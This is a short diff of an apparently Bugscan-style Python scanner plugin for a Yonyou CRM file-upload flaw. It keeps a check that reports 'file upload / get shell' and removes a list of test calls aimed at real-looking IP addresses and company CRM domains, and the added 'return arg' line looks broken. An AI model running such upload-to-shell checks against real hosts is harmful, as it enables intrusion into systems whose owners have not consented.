@@ -49,12 +49,7 @@ upload
         if 'c4ca4238a0b923820dcc509a6f75849b' in res:
             security_hole(arg+payload+" ---> "+arg+"tmpfile/"+reRes[0]+" : file upload / get shell")
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('yongyou_crm', 'http://111.207.244.5:8888/')[1])
-    audit(assign('yongyou_crm', 'http://prm.yonyou.com/')[1])
-    audit(assign('yongyou_crm', 'http://180.169.30.13:2046/')[1])
-    audit(assign('yongyou_crm', 'http://112.64.196.14/')[1])
-    audit(assign('yongyou_crm', 'http://crm.naide.com.cn/')[1])
-    audit(assign('yongyou_crm', 'http://crm.szclou.com:8088/')[1])
-    audit(assign('yongyou_crm', 'http://119.6.104.10:7788/')[1])
